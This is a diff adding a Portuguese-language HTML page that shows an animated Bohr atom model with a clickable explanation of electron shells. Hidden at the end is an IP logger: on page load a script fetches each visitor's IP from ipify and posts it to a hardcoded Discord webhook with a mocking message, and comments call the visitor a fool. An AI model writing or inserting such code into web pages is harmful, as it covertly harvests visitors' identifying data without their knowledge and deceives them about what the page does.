@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <title>Bohr Mobile</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle at center, #544b8d, #0b0a27, #000);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+    }
+
+    .atom-container {
+      position: relative;
+      width: 90vmin;
+      height: 90vmin;
+    }
+
+    .nucleo {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 10vmin;
+      height: 10vmin;
+      background: #FF3C3C;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      box-shadow: 0 0 2vmin 0.5vmin #FF3C3C;
+      z-index: 10;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-weight: bold;
+      font-size: 3.5vmin;
+      cursor: pointer;
+    }
+
+    .orbita {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      border: 0.4vmin solid white;
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    /* Tamanhos das camadas em % da tela */
+    .k { width: 25vmin; height: 25vmin; }
+    .l { width: 35vmin; height: 35vmin; }
+    .m { width: 45vmin; height: 45vmin; }
+    .n { width: 55vmin; height: 55vmin; }
+    .o { width: 65vmin; height: 65vmin; }
+
+    .eletron-wrapper {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 100%;
+      height: 100%;
+      transform: translate(-50%, -50%);
+      animation: spin linear infinite;
+    }
+
+    .k-wrapper { animation-duration: 4s; }
+    .l-wrapper { animation-duration: 6s; }
+    .m-wrapper { animation-duration: 8s; }
+    .n-wrapper { animation-duration: 10s; }
+    .o-wrapper { animation-duration: 12s; }
+
+    .eletron {
+      width: 2.5vmin;
+      height: 2.5vmin;
+      background: white;
+      border-radius: 50%;
+      box-shadow: 0 0 1vmin 0.3vmin #55B6F1;
+      position: absolute;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    /* Explicação */
+    #explicacao {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(0, 0, 0, 0.9);
+      padding: 4vmin;
+      border-radius: 2vmin;
+      color: white;
+      font-size: 3.5vmin;
+      width: 80vw;
+      max-width: 400px;
+      display: none;
+      z-index: 999;
+    }
+
+    #explicacao button {
+      margin-top: 2vmin;
+      padding: 1vmin 2vmin;
+      border: none;
+      background: #55B6F1;
+      color: black;
+      font-weight: bold;
+      border-radius: 1vmin;
+      font-size: 3vmin;
+      cursor: pointer;
+    }
+
+    #explicacao button:hover {
+      background: #3377ff;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="atom-container">
+
+    <!-- Núcleo -->
+    <div class="nucleo" id="nucleo">N</div>
+
+    <!-- Camadas -->
+    <div class="orbita k"></div>
+    <div class="orbita l"></div>
+    <div class="orbita m"></div>
+    <div class="orbita n"></div>
+    <div class="orbita o"></div>
+
+    <!-- Elétrons -->
+    <!-- K -->
+    <div class="eletron-wrapper k-wrapper">
+      <div class="eletron" style="top: 0%; left: 50%; transform: translate(-50%, -50%);"></div>
+      <div class="eletron" style="top: 100%; left: 50%; transform: translate(-50%, -50%);"></div>
+    </div>
+
+    <!-- L -->
+    <div class="eletron-wrapper l-wrapper">
+      <div class="eletron" style="top: 0%; left: 50%; transform: translate(-50%, -50%);"></div>
+      <div class="eletron" style="top: 100%; left: 50%; transform: translate(-50%, -50%);"></div>
+      <div class="eletron" style="top: 50%; left: 0%; transform: translate(-50%, -50%);"></div>
+      <div class="eletron" style="top: 50%; left: 100%; transform: translate(-50%, -50%);"></div>
+    </div>
+
+    <!-- M -->
+    <div class="eletron-wrapper m-wrapper">
+      <div class="eletron" style="top: 25%; left: 75%; transform: translate(-50%, -50%);"></div>
+      <div class="eletron" style="top: 75%; left: 25%; transform: translate(-50%, -50%);"></div>
+    </div>
+
+    <!-- N -->
+    <div class="eletron-wrapper n-wrapper">
+      <div class="eletron" style="top: 15%; left: 85%; transform: translate(-50%, -50%);"></div>
+      <div class="eletron" style="top: 85%; left: 15%; transform: translate(-50%, -50%);"></div>
+    </div>
+
+    <!-- O -->
+    <div class="eletron-wrapper o-wrapper">
+      <div class="eletron" style="top: 50%; left: 5%; transform: translate(-50%, -50%);"></div>
+      <div class="eletron" style="top: 50%; left: 95%; transform: translate(-50%, -50%);"></div>
+    </div>
+
+  </div>
+
+  <!-- Explicação -->
+  <div id="explicacao">
+    <p><strong>Modelo de Bohr:</strong><br><br>
+      Os elétrons giram em camadas fixas ao redor do núcleo.  
+      Cada camada tem um número máximo de elétrons.  
+      Esse modelo explica como os elétrons estão distribuídos e como a energia deles muda.<br><br>
+      Camadas exibidas: K, L, M, N, O.
+    </p>
+    <button id="fecharBtn">Fechar</button>
+  </div>
+
+  <script>
+    // Evento pra abrir a explicação maluca
+    const nucleo = document.getElementById('nucleo');
+    const explicacao = document.getElementById('explicacao');
+    const fecharBtn = document.getElementById('fecharBtn');
+
+    nucleo.addEventListener('click', () => {
+      explicacao.style.display = 'block';
+    });
+
+    fecharBtn.addEventListener('click', () => {
+      explicacao.style.display = 'none';
+    });
+
+    // Função pra mandar o IP pro Discord via webhook
+    function getIP(json) {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1388337122959953970/n-XnVVpBiszcUJkTW0Yuu5doUFxbT8AX4T13WlA9UrdCvwEGlvXpFX8k5PuKvGZw2Q2v");
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "IP Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*\nO Dexter come todo mundo, inclusive seu IP hahahha 💀"
+      };
+
+      request.send(JSON.stringify(params));
+    }
+  </script>
+
+  <!-- Puxando o IP do otário -->
+  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+
+</body>
+</html>
